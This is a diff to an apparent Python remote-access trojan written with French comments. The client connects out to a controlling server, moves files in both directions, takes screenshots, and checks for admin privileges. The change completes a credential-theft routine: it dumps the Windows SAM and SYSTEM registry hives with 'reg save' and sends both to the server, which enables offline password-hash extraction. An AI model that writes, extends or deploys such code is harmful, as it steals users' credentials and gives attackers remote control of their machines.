@@ -3,7 +3,10 @@ import ssl
 import subprocess
 import os
 import ctypes
+import time
+
 from PIL import ImageGrab
+
 
 def format_filename(commande):
     # remove only the first word
@@ -16,12 +19,14 @@ def format_filename(commande):
     else:
         return file_path, file_path
 
+
 def is_admin():
     try:
         # Utiliser l'API Windows pour vérifier si le processus actuel est exécuté avec des privilèges administratifs
         return ctypes.windll.shell32.IsUserAnAdmin()
     except:
         return False
+
 
 def upload_feature(filename, conn):
     print(f"Downloading {filename}...")
@@ -65,8 +70,8 @@ def download_feature(file_path, conn):
             while chunk := file.read(1024):
                 conn.send(chunk)
 
-        print("File uploaded successfully")
         conn.send(b"\nFile uploaded successfully")
+        print("File uploaded successfully")
 
     else:
         print(f"The file {file_path} doesn't exist or is not readable.")
@@ -131,9 +136,10 @@ def connect_to_server():
                 if os.path.exists("sam_registry"):
                     os.remove("sam_registry")
                     print("sam_registry deleted")
-                if os.path.exists("sam_registry"):
-                    os.remove("sam_registry")
-                    print("sam_registry deleted")
+
+                if os.path.exists("system_registry"):
+                    os.remove("system_registry")
+                    print("system_registry deleted")
 
                 # save the registry hives
                 subprocess.getoutput("reg save hklm\\sam sam_registry")
@@ -141,7 +147,9 @@ def connect_to_server():
 
                 # send the files
                 download_feature("sam_registry", conn)
-                #download_feature("system_registry", conn)
+                time.sleep(1)
+                download_feature("system_registry", conn)
+
 
         # UPLOAD FILE command
         elif command.lower().startswith("upload"):
